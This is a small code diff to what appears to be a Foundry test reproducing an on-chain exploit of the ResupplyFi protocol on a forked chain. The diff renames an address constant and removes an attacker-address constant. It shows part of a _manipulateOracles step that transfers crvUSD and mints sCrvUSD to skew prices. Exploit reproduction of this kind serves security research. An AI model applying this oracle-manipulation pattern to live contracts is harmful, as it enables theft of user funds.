@@ -78,8 +78,7 @@ contract ResupplyFi is BaseTestWithBalanceLog {
     ICurvePool private constant curveReusdPool = ICurvePool(0xc522A6606BBA746d7960404F22a3DB936B6F4F50);
     IUniswapV3Pool private constant uniswapV3Pool = IUniswapV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
 
-    // Attacker Address
-    address private constant attackerEoa = 0x6D9f6E900ac2CE6770Fd9f04f98B7B0fc355E2EA;
+    address private constant crvUSDController = 0x89707721927d7aaeeee513797A8d6cBbD0e08f41;
 
     // Exploit Parameters
     uint256 private constant forkBlockNumber = 22_785_460;
@@ -116,7 +115,7 @@ contract ResupplyFi is BaseTestWithBalanceLog {
     }
 
     function _manipulateOracles() internal {
-        crvUsd.transfer(0x89707721927d7aaeeee513797A8d6cBbD0e08f41, crvUsdTransferAmount);
+        crvUsd.transfer(crvUSDController, crvUsdTransferAmount);
         crvUsd.approve(address(sCrvUsdContract), type(uint256).max);
         sCrvUsdContract.mint(sCrvUsdMintAmount);
     }
